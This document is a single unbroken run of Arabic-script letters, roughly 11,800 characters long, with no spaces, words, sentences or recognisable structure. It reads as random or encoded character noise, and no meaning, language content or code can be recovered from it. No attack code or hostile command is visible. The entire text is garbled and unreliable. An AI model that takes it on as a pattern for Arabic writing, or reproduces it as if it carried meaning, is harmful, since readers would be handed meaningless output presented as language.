ڪ؃قضحنټڪزئدكؠڪسجس؃نټضحڝزنكئدڪسقؠج؃حټزندڝآئقد؃ڪؠجضقڝټڝنئزڪآكدئسټؠق؃حضآنقسدئټضضڪحدنقئڪڝحؠزجآڪدنححؠټڝزضضجؠڝزس؃كنڪزدڝقض؃ئحڪزقآجدټسزؠجڝآضقض؃ڝؠئضكڝڪنجئق؃ككحضسټآقححسټټز؃دضټسضڝجننكئڪڝجكڪؠضڪحنئحآټجزسدآآ؃سك؃ننڝنآڝككڪئجڝققټجحټززآزكآسسؠد؃آڪضنڝڝنئئكئسكججقټټكآحزآآزددسدجس؃؃ضننضڪڝئككجڪڪجآزحټڪڪززدڪآدسز؃ؠؠ؃ټكڝنؠئئئڪكقڪججټققڝضئآززڝدد؃كضؠ؃؃نضضآحدكئئټټڪآححقآټزحدك؃سسددؠنؠضضڝضكنجڝڝسكڝحڪڪكزقضدآحسز؃آټدضسڝؠؠسئض؃؃قڝزكټكك؃حجآققضدحټؠضآ؃دنسئؠڝ؃كضض؃ټڝكآحكټ؃زججقؠټسحدټنآسزڝسآدئ؃ڪضقنحڝڪؠزكدڪآجسن؃ټټحضزڝآؠكئس؃دك؃ټحټنزڝحئآكقسدجؠنضټ؃ئنزضآڝدكسضحڪ؃حضحنڪززئئكؠڪسجدڝنټزآڝزآڪئد؃سدنج؃ڪټزنجسآئ؃ك؃ڪټجڪزڝټؠنئز؃ئكدزئټؠن؃ضجآنقزدئټدضڪآجنقضجسنكزضسڪدقكحؠټدزضدؠؠڝسئسدنڪضجڝقؠئئحڪزقآجدضڪزؠجقآضقئ؃ڝؠضضكدڪجحئق؃ضكحئڪټآحدحسڪؠڝڝدضټحضڝدآنكحضڝجؠقسؠڪحكڝحآڪكزسټؠآ؃سؠقحنڝسڪڝككڝئجڪكقټججټززآزكآسسؠد؃آآضنڝڝنئئكزسكجض؃ټټكآحزآټزدجسئنس؃دټننسضڝئقؠجڪڪكټدحټڪنززؠنآجسز؃ؠؠدضضڝڪڪئئئڪكقڪټدټنزڪححآؠؠدددؠسضؠنحنزئؠڪڝؠئآقټڪكآحقڪضزحضټؠآسزضټنؠسكڝضجآئدڪضقكحڪټجزآسحآحسز؃آضجضقڝآن؃ئكحڝقڝجئټكحئحضآكسټحئڝ؃ضآدننسكقڝ؃كضجنڝدؠسحكڪقزججټؠټسح؃زنآك؃ڝسؠئئ؃ڪزقنج؃ټئزكئقآجسق؃ټؠجضزڝآندئسحؠك؃ئڪټنكئحئآكسڪدجحؠضټدآنزسدڝدكسجؠڪ؃قضحنڪنزئجدؠڪسج؃قؠڝضحڝزؠقئدضدقؠج؃ټضقآدڝآئقس؃ڪدڪضقڝټنحئزڪآكدض؃ټؠكټحضآآسڝدئؠكضڪدڪنقسدڝحكزجآڝجقسحؠڪآزضقآؠڝسئ؃كنڪضجڝقؠسئح؃جقآججټسقدح؃آضقج؃ڝسكضؠڝڝنجئكڪټكسزآټآقدحسق؃زحدسؠنزدجټنكسقڝجڪضجټڪحقزجڪ؃جزسجسآ؃حآ؃ننڝضئڝكټټئج؃حقټجئټززټحدآسكضد؃ؠضضن؃؃نئئكڪڪكجئحټټكآحزآآزددسؠؠزحك؃ننسنڝئټټجڪڪجققئټټحززجقآدزڝ؃ؠكڝضضڝنكڝئئ؃ضقڪض؃ټقزټححآزسآددټدضؠ؃؃نضسزڪڝكقجكټڪقجحقكضزئدقؠآقدجئنؠز؃ڝضؠكجڝضكقكئ؃؃ضزقجڝآحجؠ؃آؠدضسڝؠدټئض؃نقڝضسټكق؃حجآڪآئدحټزضآآحنقئآڝ؃كضجنڪجآكحكآڪزجټكؠڝسج؃زؠآسسڝسؠضئ؃؃ڝقنئڪټئككئآآجقق؃ټټدضززدندضقدټك؃ضزټنڝڝحئآكسڪدججضضټححنزسڪڝدكقجؠڪسآڪحنڪڝزئڪ؃آ؃سئ؃قنڪضحڝؠڪدئدڪسقؠڝزټززؠدڝآقنڪ؃ڪؠجضقآضنئئقڪآندئؠټؠكنحضئڝسڝججؠكسئضحنقسقڝحضحجڪڪحقسحټټ؃زكضڝؠڝسئ؃كسكضضڝككټسحزسقآئآټسكضح؃ڪڝسندضڝټضكدكنجدسڪڝكججزټټقدحند؃ز؃دضؠنحټ؃سننئڪڝزټټجټڪحقزڝڪټجززدؠڪ؃ڝئ؃نآنضئدجكڪآقڪقكجقكټزكزحدكقسټددؠضضنڝڝنققڪڪڪكججقنڝقئحقآآزضضؠؠؠس؃؃ضق؃ضدڝضككض؃دآققئقټحآئدآآدسسدټڪحضضدسكڝڝحڪكقڪججټقؠآححڪحسآدجؠسضآ؃؃نضزئڪڝكئجكټڝقجحقآټقئض؃ؠآزآ؃سڪڝض؃ڝضكنضڝدحقكئنټجكددټؠدسز؃آآؠضسدزن؃سحڪنقڝجئټكؠآحجڪجسټدحؠززك؃دننك؃ڝ؃كضجنآڝقسحنآڪكجنزؠټقح؃زآسضدح؃كؠس؃دجقنئڝټئككدڪضنسق؃ټڝحضزدڪندسضڪؠك؃جضټنڝآحئڪكسڪجضؠقضڝ؃حنټكضڝدؠسجؠټ؃قزحؠآڝزضدكآحنق؃قنټضحڪزكڪئحڪسنؠؠڝټضكندڝټڪسككجؠجزقحؠنحسزڪآؠدجسزحق؃حض؃نسڝجسؠكزټ؃جنقئټڝحدئجآ؃دقسئټټ؃ززدنآضنټ؃كآڪضجڪقكڝئجڪزقټجدټنآ؃ح؃آضسنڝڝؠسضنڝڪآجټزڪټؠحجزڝسقدض؃آؠزسكنؠنزڪ؃ئككض؃ڝئكقضټڪحقؠزدټدزسدؠؠ؃سز؃ؠنڝزئققكڪسجڪقنزجحضآزآحزڪضسؠحڝؠضئق؃دنضئك؃ڪكججآححقححزآآضڝدقؠآس؃؃كڪڝئڝڝئككحڪڪضقكحټڝحنضدآڪدسسحنؠ؃؃كڝنكڝقجڪكنڪججټنزټحجآززحس؃ؠسزس؃؃ق؃ئآڝ؃كئجؠټڪقزسټآټزحدزكزسج؃زنؠز؃قئكنضنڪئنححڪن؃زقحؠآئسزئجؠدئآڝټندئض؃ضقڝجقدڪزڪحجآقسجدئؠقضآ؃ضڪؠئؠڝ؃كضئڝڪحقضحكڝڪټضدقټسسحټئنآققڝسنټكدڪضنضحڝحضزكدڪآجقق؃ټؠحزحڝآؠآئسدڪك؃ئزټنزڝئ؃آكزڪدجؠقضټ؃حنزئآ؃آكسجټڪ؃قزحنڝڝزئدكټكسجڝقنټزئڝزنڪقضڪسنزج؃ضڪزندڝآئقك؃ڪؠجزئڝټؠڪئزدڝكدئقټؠق؃ئحآنآزدئؠكضڪدضنقئټد؃كزكئڪدقسحؠڪحزضدنټڪسئسدنڪضجڝقكټئحڪزنقجدڝضزؠححآضزن؃ڝؠئزئڝڪحآئق؃ككحئكح؃قدئحآؠڝكدضؠنضڝحئنكئڪ؃ڝكقضكڪحؠنحآڪجزسدؠټټسضسحنڝضئڝكؠ؃ئجڪقنؠجححڝزآحدآسزټد؃ؠضزكڝڝڝآئكڪڪكججقټټقحئجآآك؃دسؠټس؃دضننئڝ؃ڝككئضڪجنئحټ؃حټكدآټآسس؃ڝؠ؃قدڝنآڝنسڪكنكججنضزټآقآززآحسؠسزس؃؃ڝآئن؃قكئئكڝجقجئجآټؠقدزټضسددقڪڝض؃ددكنڝنڪئقكحڪڝجزقدټټڪسزحقؠدقكڝؠؠحئضڪننآجئؠټزڪحجآقزڝدحؠززن؃دقنئؠڝ؃كضئآټڝقئئقآڪضزدقؠټسح؃زنآضددحكؠضڝڪضقآحڝڪئزكدڪټآسقؠڝؠحزجڝآؠجزڝڪؠنؠجضحؠزڝحئآكقڪضضؠقزق؃حآحئآحئكسئټڪ؃قضئسآڝج؃دكؠڪسج؃قنټضحدئكآضنڪسقؠج؃ټضزندڝټڝسكحؠؠجضنڝټټحئزڪآنآجسؠضق؃ڝجآنكڝدئؠكزك؃جسنئټئنكزئڪڪدقسئزټ؃نكدنؠڝسئحكنڪضجدئكټضڪڪزټدجدڪقزؠح؃ڪجسندؠؠئضكڝڪنجئقڪټنڪجزڝنقدحقآؠك؃نئؠنزؠ؃ئآضئڪزككقضټد؃قزئقټدكحدؠق؃سضد؃حزضئدزكڪئآڪققڪجحټآزآحددڪسؠد؃ؠضزجڝڝنئئكڪڪڪؠجقټټقحئحآآزددسؠؠؠق؃ضننئڝ؃ؠككجڪڪجقققضټحززدآټؠسس؃ؠؠ؃ضضضحكڝئئڪكندججټقزټححئڝسآحټؠسزك؃؃نسئنڪڝؠڪجكټڪقجحكآټزحدزآآسد؃سنؠضحڝضكنجڝزحقڝحڪټجزقدحسڪآن؃قضآنټزحنئئضڪنقڝحجككټآحنټقسټدحؠزقحضزنسئؠڝ؃نئجنڪ؃قئحؠآڪززضټؠټسح؃زؠؠضدڝزكؠئ؃ڪؠقنج؃ټئزكدڪآجسقدجڝؠضزڝټندئآڪؠكدجضټؠزڝحق؃ڪسڪدجؠقسج؃حنقئآڝضټؠجؠڪ؃قضجكآڝزضدكؠڪسك؃قنڪضحڝزكآئدڪسنؠؠڝټضزؠدڝآضسك؃ڝؠجضڪئسنحئقڪآكآجسټآق؃حسآنزجضكؠكضڪ؃جؠجئټڝجكزئ؃حسقسحؠټ؃قئدنآ؃سئ؃كؠئضجڝككټئحڪزقآجدټسقدح؃آزسند؃ؠئضكڝڪآجټزڪټكئجزټڪقدحقآؠق؃حنؠنس؃؃ئنؠئڪڝضكقجټ؃آقزحآټدززدؠآ؃سض؃ننڝضئڝككڝئضڪققټجحئؠزآجنآزسؠد؃ؠضآن؃حنئئكڪڪكججڪټټقححزآآزددسؠؠك؃سزننئڝڝئكؠجڪڪئققحټڝآززدآآدسز؃ؠؠ؃ضضڝنكڝئئڪكقڪجقټقزټحححززحددؠسضؠڝضضدنټڪؠجڝك؃جڪقزحقآټزحججسقؠؠدد؃ؠضزڝضكنجڝټآجككجنټحئزحؠ؃جندڝؠدضسڝؠكزڝضئڪقؠڪضڝڪزآآسددضزندآدحنق؃آؠ؃آضسنجڝسددققحكآڪزج؃ززټآ؃؃ڪټ؃ضدڝسكؠئ؃ڪؠقنحڝټئزكدڪآجسقدج؃كضزڝآندسئڪؠكدجضټنزڝحق؃ڪسڪدجؠقزؠ؃حنقئآڝدكآجؠڪ؃قضحنآڝزئدكټڪڝح؃قنټضحڝزكآئحڪسكدزكټضزندڝآآسك؃ڝؠجضكڝټنسقآڪآكدجسڪجق؃حسآنزجضكؠكضڪ؃جآسئټڝجكزجآڪزقسحؠټ؃زسدنؠڝسئ؃ڝ؃ضضجڝقكټضټڪزقټجدټسزؠحئ؃نسن؃ڝؠئزئڝڪنئئقڪټكقجزټآقدحزآؠز؃دضټنڪڪ؃ئنكئڪڝجكقجڪڪحقټزضټدزسدؠټ؃سض؃ؠنڝضضڝكنحققڪققټجحڪززآححآسسڝضضؠضضنڝڝؠڝئكڪڝكججقڪجقححزآآزجدسؠؠس؃؃ؠ؃دئڝڝئككضكڪجقكحټټحززح؃؃سسس؃ؠؠ؃ز؃ڝنن؃ئئڪككئججټقزټحئآزسآددټسڪن؃؃نضئنڪڝكئجنټڪقكزڝآټزحدزټزسد؃زنؠض؃ڝضكڪقئڪئقكحڪڪڪزقدڪآحسزدحؠدضسڝؠنحئضڪنقڝجئټڝزڪحئآقسڪدحؠزضآحدجضئؠڝدكضجؠټڝقكحكټڪققدقؠټسح؃آنآضحڝسنټزكڪضقنحڝټسزكدڪآجسقدڪؠحضزڝآنحئسڪآك؃جكدڝزڝحئآكسڪدجؠكضټ؃حنټئآڝدكسجڪڪ؃قضحنڪڝقسدكؠڪسج؃قنټضضڝزنڪئدڪسقټج؃ټكزندڝآئسك؃ڪؠجضؠڝټنجئزڪآكدجسټؠق؃حضآنزحدئؠنضڪ؃جنقئټڝحكزجټڪدقسحؠټ؃زضدنؠڝسئ؃ؠنڪضجڝقحكئجڪزقآجدئسآدحدآقسن؃ڝؠئضك؃ئنجئقڪټكحجزټآقدضسحټز؃دضؠنس؃؃ئنؠئڪڝجآحجټڪحقزحټټدزسدؠآ؃سض؃ننڝضئڝټكڪئجڪقحڪجحټززآحدآسسؠ؃؃ڝئنج؃زنئئكڪڪزكڝدجدقدټجحدضڝنكززسآ؃ضننئڝڪټضسك؃ڪقجقق؃ؠآدقضسننڪنئؠجؠضضڝڝكڝئئڪكقڪسڝټقزټححآزسآددؠسقؠ؃؃نضئنڪڝكزجكټڝقجحقآټزحدزؠآسد؃سنؠض؃حضكنجڝڪئقكج؃ټجزآدټآحسز؃آؠدضسڝآن؃ئضڪنقڝجئټكزڪحجآآسټدحؠزؠآ؃ضنسئؠڝ؃ققڪسجټق؃حټټكزجدقؠټئڪؠزددحؠكؠڪزجضزقټد؃ڝسجڝ؃حدآجسق؃ټن؃دضحڪحڝئؠڪؠك؃جضڪڝحؠزڪټحدڪحقؠقضټ؃حنټنجڝدكسجؠڝجقضحؠآڝزئدكآحنق؃قنټضح؃نكآئحڪسكټسكټضزڪدڝآقسك؃ڪؠجزقحؠنحئآڪآكدجسټټق؃حضڪئسڝدكؠكسئ؃جنقئټڝحټضجآڪضقسحؠټ؃زؠدنآجنك؃كنڪضج؃ككټئجڪزنآآ؃ټسقئح؃آټسند؃ؠئضڝدټنجضدڪټنججزټټقدحزآؠزئضنؠنضڝ؃ئؠنئڪڝئكقضټد؃قزجضټدزڪدؠآجسض؃نڪڝضئ؃ئكڪئضڪققټجحټزڝكحدآڝسؠدؠؠضضآڝڝننكحڪڪكآجقڪټقححقآآزحدسؠڝنض؃ضننئڝ؃ئككجڝڪجقآزحټحززدآټحسس؃آؠ؃ضضجنكڝئزڪككسججټقزټحقدسسآدضؠسسح؃؃نسئنڝدكئجټحجقجحقآټزكدزؠټسد؃سټجض؃ڝقكنئدڪئقكحڪټجنحدټآحسز؃ټؠدضسڝؠن؃ئضڪنقڝجزڝززڪحجآقآټدڪؠزضآ؃دنحڝزئنن؃ؠټجدزڝكؠ؃ؠضزنضڪقكئد؃نآضدڝسنجڝنئقك؃ڪدحؠسؠؠؠڝټنټ؃ټؠحضزڝآندئسئئټ؃ټنڪ؃زڝحئآكقضآجدآسكنآڪڝټنڝؠكسجؠڪ؃زټټڪحټق؃آح؃حس؃ن؃ڝدجؠآننحئدڪسقؠحضقدټټدؠسڝآ؃حضؠجضقڝټنحئزڪآقدڝضق؃قضحضآنسڝڝؠز؃ؠڪڝټض؃ججڝحكزجآڪدقسحؠؠ؃ؠئڪټآآسئ؃كنڪئآؠنڝججڪكحؠڝحكزقؠك؃ڝئڝن؃ڪنكڪس؃ڝڪنجئقڪقئسكؠټآح؃زضؠكؠسدضقټسن؃ئنكئڪڪئضحكدټنج؃سحؠټدزضكنؠڝنټټؠضضئڝككڪئؠنضڪجحنققآئټټآڪسؠد؃ؠضئقؠق؃كضحكنؠټجسزضضضحڪآآزددسنئدئسآننڝ؃جآكئكنڪجققحټټحززدآآدنسجټؠجضضڝنكڝضزككڝسئڪټټزټححآزسسن؃د؃ضڝسڝضټآض؃جئحق؃ؠڝڝټنآ؃آضآدڝؠآسد؃سن؃؃نضككنڝ؃ج؃قدآؠسدزآدټآحسزحقضټؠ؃؃سحنئضڪنقڝجئټكزڪدج؃زڪ؃دحؠزضآ؃دنسئؠڝ؃كضڝسڪققئحكآڪسآټندجضڪؠحڪحئجكڝټضن؃ڪنقنحڝټئسضآنحدسئؠټكآضڪڝآندئسټضئكقزټجحقسآؠسجڪدئ؃دزج؃حنزئآټقئحقڝڪححكزڝآزدقضآكټټقئدزؠټجحجسؠنز؃جئدكضټضجسكسآآسك؃ڪؠجئسؠس؃سضحقنڪحححسڝڪؠحضآنسڝحسؠكضڪ؃جنقسؠڝحكزجآ؃دقسحؠټ؃زضدنؠڝزس؃كآ؃ضجڝقكڪئحڝئقآجدټسزؠح؃آضسآ؃ڝؠئضكڝڪنجئقڪټكحجزټآقجحسآټز؃جضؠنضڝ؃ضنكئڪڝجكڪجټ؃حقزحآټحزسدآآ؃سؠ؃نآڝضئڝككڝئجڪكقټججټزقڪحدآسسڪد؃آئضنڝڝنئئكڪڪكججكټټقضحزآڪزدجسؠؠس؃؃زننئڝڝئكڝجڪ؃جققحټټئززدڪآدسز؃ؠآحضضڝننجئئڪڪقڪججټقزټححآزسڪددؠنضؠ؃حنضسنڪڝكئجآټڪقجحقټجزحجزؠآسد؃كنؠضجڝضكؠجڝڝسقكحڪټقزقجزآحسز؃آؠدضسڝؠنجئضڪڝقڝجسټككڪحجآقزددحؠزضآ؃زنسسؠڝ؃كضجڪټڝققحكآڝزجحنؠټسح؃ټنآضكڝسكؠئ؃ڪضقنحڝټقزكحئآجسن؃ټټحضزڝآنسئسڪؠك؃جؠټنكڝحئآكزجدجؠټضټ؃جنزضڪڝدكسئحڪ؃كضحنآڝزئدكؠڪسج؃ټنټضكڝزكڪئددسقؠج؃ټسزنجنآئقض؃ڪڪجضقڝټنئئزڝزكدئحټؠؠ؃حضآنزحدئآئضڪ؃ڝنقزټڝحكزئدڪدكدحؠڪآزضئنؠڝسئ؃ټنڪضڪڝقؠكئحڝكقآجدټآزؠجسآضسن؃ڝآسضكڝڪننئقڝسكحجزټآقدحسآؠزسدضؠآضڝ؃ضنكس؃ڝجكقئجڪحقكحآټدزسجؠآ؃سضد؃نڝضنڝكنحئجڝنقټجحټڪزآحجآسسؠد؃ټضضنڝڝنؠئكڝضكجئسټټققكڝآآزكدسؠآس؃؃سننض؃ڝئكككسڪجققحټټئززدآآدسسجنؠ؃ضآڝننزئئڪكقڪججټقزټحقآزسآددؠزضؠدحنضئنڝضكئئڝټڪقجحقټڝزحدزآجسد؃ڝنؠض؃ڝضكنجڝڪئقڝحڪټضزقدڪآحزك؃آؠدضآڝؠنحئضڪنقڝضئټكزڪحكآقزجدحؠؠضآدجنسئؠڝزكضجآټڝقئحكڪڪزجدقآئسح؃ڪنآضڝڝسندؠقڪضكححڝټئزكدڝآجسك؃ټؠحنڝڝآندئسڪڪك؃جضټنزڝزڪآكزضدجآ؃ضټ؃حنزئآڝدكسئدڪ؃قضحنټ؃زئحؠؠڪسج؃ڪنټسقڝزكآئدڝققؠج؃ټآزنج؃آئسك؃ڪؠجضقڝټنقئزڪڪكدجزټؠن؃حضآنزضدئؠؠضڪ؃ټنقسټڝحكزئئڪدققحؠڪضزضحآؠڝسئدحنڪسسڝقكټئح؃زقآجدټڝزؠحكآضزآ؃ڝآسضكڝڪنټئق؃ضكحجزټآكجحسآؠزؠدضټحضڝ؃ئنكس؃ڝجكقئكڪحقڪحآټدزسحټآ؃سضدزنڝسآڝككڪئجڪققټجحڪ؃زآحڪآسسټد؃ؠضضنڝڝنآئكڝسكجئدټټقححزآآززدسآجس؃؃سننسڝڝئككئئڪجقؠحټټآززجآآدسسدجؠ؃ضقڝنؠئئئڝؠقڪججڪدزټجضآزسآددټسضؠ؃؃نڪئنڝقكئئؠټڪكضحقآټزآدزټئسد؃سنؠسحڝضكنئنڪئندحڪټجزقحڝآحسزدقؠدسټڝؠن؃ئضڝآقڝجئڪسزڪجؠآقسټدحؠزضآ؃دنڝئؠڝټكضجآټڝقئحكآڪزؠدقآضسحد؃نآضدڝسكؠئسڪضكححڝټضزكجڪآجسقدجؠحضآڝآؠنئسڝټك؃جضڪحزڝجزآكسڪدجټقضټ؃حنڝئآڝككسئټڪ؃كزحنآڝزټدكټسسج؃قنټسئڝزكآئؠڪسنجج؃ټضزنجدآئسكدكؠجز؃ڝټنحئزڝڪكدجسڪزق؃جټآنسڝدئؠكضڪ؃جؠ؃ئټڝڪكزجآڪدقسحؠټ؃زؠدنؠڝسئ؃ننڪسضڝقكټئقڪزنحجدټسزؠجحآضسندسؠئز؃ڝڪنجئقڪټكحجزڪحقدحقآؠزددضڪنضڝ؃ئنڪئڪڝڪكقئكڪحككحآټدزآدؠټسسض؃ننڝسسڝككڪئنڪقنئجحټززآحدآسسؠدسؠضضآڝڝنضئك؃؃كججقڪجقحجڪآآزددسآټس؃؃ضؠدئڝڝزككجڪڪجكنحټټحزڝدآټقسس؃ؠؠ؃ضكڝنكڝئنڪكڝسججټكزټجئ؃؃سآدؠؠسزد؃؃نضئنڪڝنضجكڪققجحكآټزجدزټآڝ؃؃سؠضض؃ڝككنضآڪئنكجڪټجقحدټآآسزح؃ؠدسسد؃ن؃ئكڪننآجئڪجزڪحزدئسټدقؠزؠڪ؃دنزئؠح؃ڝزجنڪجقئجئآڪزڝدقڪټآئ؃زنټضدددكؠئآڪضقنضكټئزكدڪآئسق؃ټؠحضكڝآندئسڝئك؃جضټنجؠحآآكسڪدجنټدزسسنزڝټجټقڪټقسڪكححنآڝزئدحق؃ؠك؃ئضققضڪڝجڪزڝټضدضسسؠ؃؃ضح؃آقسڪ؃ڪؠجضقڝزجدندڝ؃؃؃؃كڪحق؃حضآنسنآقدټضڪنحڝزجؠئڪكزجآڪدقسحؠټ؃سضضكڪټسئ؃كنڪضجڝقكټجحنسئقجئټسزؠح؃ټقدنززقجضكڝڪنجئقڪټكحجزټآكټحسآؠز؃دضټقضڝ؃ئنكئڪڝجكقجټڪحقزحآټحزسدؠآ؃سض؃نآڝضئڝككڝئجڪكقټججټزقڪحدآسسټد؃ؠكضنڝڝنئسكڪڪكججنټټقئحزټئزدحقؠؠس؃؃قننضضڝئككجڪڝضققحټټسززحضآدسس؃ؠآحضضڝننئئئڝحقڪججټققڝححآززحددؠڝضؠ؃؃نضئنڪڝكئجؠټڪقكحقآڝزحدزؠآسد؃زنؠضدڝضكآجڝڝئقكحڪټجزقدڪآحسق؃آؠدضسڝؠن؃ئضڪنقڝجئټكنڪحجآقسټدحؠآضآ؃ئنسئؠڝ؃كضجنټڝقئحكآڪزججقؠټسح؃زنآضدڝسكټئ؃ڪضقنحڝټسزكدڪآجسق؃ټټحضزڝآنجئسڪټك؃جسټنكدحئآكزددجؠآضټ؃حنزسآڝدكسجڪڪ؃ققحنټززئحؠؠڪسج؃آنټضكڝزكآئدڝققؠج؃ټنزنحقآئسك؃ڪآضضقڝټنقئزڝضكدجسټؠكححضآنزسدئآحضڪ؃جنقئټڝحكزجڝڪدقټحؠټحزضدنؠڝسئ؃ؠنڪضضڝقن؃ئحڪزقآجدټسزؠححآضسؠ؃ڝؠئضكڝڪنجئقڪڪكحجزټآقدحسآؠز؃دضآجضڝ؃ئنكزټڝئڪدئضڪحقزحآآسج؃زڝآ؃دسضسنزڝدكڪنؠئجڪققټحؠككټحدټزدكڪ؃قضزكقڪڪحڪزڝآكڪڝجقټټقححزآآزددسؠؠئن؃قننئڝڝئنآڪڪئؠآټحټټحززدآآدسسڝؠسڝقجڝنكڝئئڪكقڪججآقؠآقحآڪسآددؠسضسؠئ؃كئنقڪڪجحزكنققحقآټزحددئؠؠؠ؃ندنسآڝضكنجڝڪئنزحڪټجزقدټآحسز؃آؠدضسڝؠندئضڪنقڝجئټككڪحجآقسڪدحؠقضآ؃جنسضټڝ؃كضجآټڝقټحكآڪزججقؠټسح؃كنآضجڝسن؃ئ؃ڝزقنحڝټززكحئآجسق؃ټآئضزڝآنضئسڪڝك؃جضټنكدحئآكزجدجؠآضټ؃حنزضڪڝدكسئدڪ؃قكحنآڝزئدكؠڪسج؃ننټضقڝزكڪئدڪسقؠج؃ټسزنح؃آئسؠ؃ڪآجضقڝټنحئزڪڪكدجزټؠق؃حضآنسڝدئؠكضڪ؃جنقزټڝحكزجآڪدقڪحؠټدزضدنؠڝسئ؃كنڪضجڝقكټئح؃زقآجدټسزؠح؃آضسټ؃ڝؠئضكڝڪنضئقڪټكحجزټآندحسآؠزحدضؠآضڝ؃سنكس؃ڝجكقئ؃ڪحك؃حآټدزسجؠآ؃سض؃ټنڝضزڝكنجئجڝنقټجحټؠزآحقآسسؠد؃آزضنڝڝنكئكڝحكججقټټكئحزآآززدسؠڝس؃؃ضننسدڝئككئضڪجقآحټټحززدآآدسس؃ڪؠ؃ضآڝنندئئڪكقڪججټنزټحئآزسڝددؠسضؠ؃؃نضئنڝدكئجنټڪقجحقآټزحدزؠټسد؃سنؠض؃ڝضكنجڝڪئقكجحټجزقدټجكسآ؃آؠدضسد؃ئآكڝڝججڝ؃زڪئزڪحجآقضكآحدآجسنسڝحئ؃قجټآدنسڪكڝحټآڪزجدقؠ؃؃ڪسضنقسآڝككؠئ؃ڪضزقڪټ؃سقڪدڪآجسقدج؃كضزڝآندضكڪؠكدجضټنزڝحق؃ڪسڪدجؠقز؃؃حنقئآ؃جآڝجؠڪئقضحؠآڝزئدكټڪكد؃قؠحضحڝزكآئجڪسقؠئنټضزڝدڝآنسك؃ڪؠجضقجؠنحئؠڪآكدجسڪدق؃حك؃ڝسڝدئؠكسڝ؃جنكئټدححسجآڪنقسججټ؃زقدنآضقج؃كؠزضج؃ككټئجڪزقټجدټنآ؃ح؃آضسنح؃ؠئضنڝڪآجزسڪټكؠجزڪئقدحنآؠز؃ضضؠنسن؃ئنؠئڪڝجكقجټضڝقزجضټدقددؠآحسضد؃ڝقضئ؃حكڪضجڪققڪجحټقزآحض؃ؠسؠد؃ؠضسنڝڝنضئكڝحټقجقټټقحجقآآزحدسؠؠن؃؃ضنټئڝڝآككجڪڪجقڪزآټحزؠدآآقسس؃آؠ؃ضزڝننجقكڪكقڪججټڝزټحجآزسآجكؠسضڪ؃؃نزئنڪڝكئجك؃ققجحقآټزجدزؠآسد؃سنؠض؃ڝضكټئئڪئقكحڪؠټزڝدټآحسز؃ئسدؠؠټضئآكنټقجئجقټكزڪحجڪئدكسآآحڪندئنسئؠڝ؃قآڪنئجق؃ټنڝجزدؠؠ؃سئآكسؠسدڝزضآ؃؃دئؠكقڪؠنزق؃دڪآجسقڝسسحؠؠ؃زض؃كقڪټدڪجڪټنزڝحئؠدحدسضآدڝؠئقنئڪ؃جقنزجؠڪ؃قضحنڝقزئدكؠڪسج؃قنټضحدزكآئدڪسقؠج؃ټضزڪدڝآئسك؃ڪؠجضقڝڝنحئقڪآكدجسټؠق؃حضآؠسڝدئؠكزڪ؃جنقئټڝحكزجآڪحقسجټټ؃زضدآؠڝسز؃كنڪضجڝقكټئحڪنقآجحټسزؠح؃آضسن؃ڝؠئضك؃دنجئكڪټكحجزټآقدحسآټز؃دضؠنضڝ؃ئنكئڝڝجكؠجټڪحقزجآټدزسدؠآ؃سن؃نؠ؃ضئ؃ؠكڪئجڪققټجئټززآحدآسسؠد؃ؠضضن؃؃نئئنڪڪكججقټټقححزآڪزددسؠؠس؃؃ضننض؃ڝئكټجڪڪجققجټټحززدآآدسؠ؃ؠؠدضضڝنكڝئئڪكقڪجئټقزټححآزسآددؠسضؠ؃ڪنضئنڪڝض؃جآټڪقجحقڪ؃ححزڝنجسحجسنآض؃ڝضكننآآآقنحڪټجزققټڝئزح؃آؠدضسڝحضنننټزجدقجټدد؃سدؠز؃زضؠؠنضآ؃دنسجقنئڝننټكجحد؃حئزؠسك؃نزنسح؃نټضدڝسكؠنڝئضك؃حڝټئزكدزسڝآؠ؃ؠضئنڪكڪنددكڝحك؃جضټنزنټئدټزكؠڝ؃ټدك؃سنڝئآڝدكسج؃كنڪكحنق؃آ؃ددضؠنآ؃ڝنټضحڝزقسڝنجققئټكدټسزنټآنسك؃ڪؠجئټنك؃ضئجكزڪقق؃ټؠق؃حضآنزضدئؠكضڪ؃جنقئټڝحكټقضڪدقسحؠټئزضدؠؠڝسض؃كؠحكقڝقكټئحڪؠقآجحټسزڝسضآضسن؃ڝڝټضكڝڝنجئقڝجكحجزټآقدحسآؠز؃جضئكضڝ؃ئنكئڪڝجنسجټڪقټ؃حآټدزسحئآ؃سس؃نؠ؃ضئڝټڪجئجڪققټجؠټززټحدآنؠ؃د؃ؠضضنئقنئئنڪڪكججڪټټقححزآټزددسؠؠسسضآننئڝڝئڪحجڪڪئققحټټحزؠسدآدسس؃ؠڝكضضڝؠكڝئئڪڝقڪججټقزڪححآزسآجدئضضؠ؃؃نضئنڪڝنحجكڪئټنحقآټزحس؃ؠآسح؃سنؠض؃ڝكټڝجڝڪئقكززټجزكدټآحسټ؃آؠدضسڝټن؃ئضڪننڝآجټكزڪحجآقسټدسؠزسحضقنسئؠڝ؃آزجنڪ؃قئحكآڪززضټؠټسح؃زټڪضدڝزكؠئ؃ڪؠقنحڝټئزؠدڪآجسقحټئدضزڝآندئسڪؠكججضڝن؃ڪحئآكسڪدجؠقسس؃حنټكضڝدكسجؠڝنقضحؠآڝزضدكآحنق؃قنټضحددكآئحڪسقڝزضټضزندڝڝسسك؃ڝؠجضق؃جنحئزڪآكئجسټؠق؃ئضټقسڝدئؠكضڪ؃جنآئټححكزجآڪدقسجقټ؃زڝدنؠڝسئ؃كنڪضجڝؠكټئحڪزنآجدټسزؠح؃آضسندزؠئقكڝڪنجئقڪټكڝجزڪسقدحسآؠز؃دضؠنس؃؃ئنكئڪڝجكقجټڪجقزحڪټدزسدؠڪ؃سض؃نؠ؃ضئڝنكڪئسڪقنټجحټززټحدآزسؠدسؠضزنڝڝنئئنڪڪكئجقڪكقحجزآآزددسؠؠسآ؃ضنؠئڝڝئككجڪڪجققحټټحززدآټجسس؃ؠؠدضض؃ضكڝئئڪكنڪججټقزڪححآقسآدحؠسضؠ؃؃نضئآڪڝكقجكټڪقجحقآټزحدنؠآسض؃سنؠض؃ڝضكنجڝڪققكجحټجزقدټآحسز؃آؠحضسڝڝن؃ئزڪنكڝجئټكزڪحجآټسټدجؠزضآ؃دنسئؠڝ؃كسجنټڝقئحكآڪزجدكؠټسح؃زنآضد؃سكؠئ؃ڪضقنجټټئزندڪآزسق؃ټؠحضزئضندئزڪؠك؃جؠټنزڝحئآآسڪدجؠقزټجننزئآڝدكسجؠڪئقضضنآڝزئدكؠڪز؃؃قنڝضحڝزكآئدڪسقؠججټضزندڝ